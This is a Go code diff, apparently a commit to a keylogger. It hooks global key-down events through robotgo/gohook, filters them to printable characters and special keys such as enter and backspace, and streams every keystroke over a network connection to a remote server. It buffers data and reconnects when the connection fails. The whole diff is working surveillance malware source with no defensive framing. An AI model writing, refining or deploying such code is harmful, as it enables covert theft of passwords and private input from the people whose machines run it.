@@ -16,7 +16,7 @@ const (
 )
 
 var (
-	cbuf = ""
+	valid = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\"!£$%^&*()-_=+[{}];:'@#~/?.>,<|\\ ")
 )
 
 // establishes a connection to the server.
@@ -35,40 +35,55 @@ start:
 	return conn
 }
 
-// sends keys to the server
-func dispatch() {
-	conn := establish()
-	for {
-		if len(cbuf) > 0 {
-			_, err := conn.Write([]byte(cbuf))
-			if err != nil {
-				dispatch()
-				return
+// tracks keys and sends them to the channel.
+func track(key chan string) {
+	eh := robotgo.EventStart()
+	for e := range eh {
+		if e.Kind == gohook.KeyDown {
+			switch e.Keychar {
+			case 8:
+				key <- "<backspace>"
+			case 9:
+				key <- "<tab>"
+			case 13:
+				key <- "<enter>"
+			default:
+				for _, k := range valid {
+					if e.Keychar == k {
+						key <- string(e.Keychar)
+						break
+					}
+				}
 			}
-			var data []byte
-			rl, err := conn.Read(data)
-			if err != nil {
-				dispatch()
-				return
-			}
-			cbuf = cbuf[BUFFER-(BUFFER-rl-1):]
 		}
 	}
 }
 
 func main() {
-	// update and send cbuf to server when needed
-	go dispatch()
+	// track keys
+	key := make(chan string)
+	go track(key)
 
-	// start listening to keys
-	eh := robotgo.EventStart()
-	for e := range eh {
-		if e.Kind == gohook.KeyDown {
-			if e.Keycode == 49 {
-				cbuf += " "
-			} else {
-				cbuf += string(e.Keychar)
-			}
+	// data buffer in case of disconnection
+	buff := ""
+
+restart:
+	conn := establish()
+	for {
+		data := []byte(<-key)
+		if len(buff) > 0 {
+			data = append([]byte(buff), data...)
+			buff = ""
+		}
+		_, err := conn.Write(data)
+		if err != nil {
+			buff += string(data)
+			goto restart
+		}
+		_, err = conn.Read(data)
+		if err != nil {
+			buff += string(data)
+			goto restart
 		}
 	}
 }
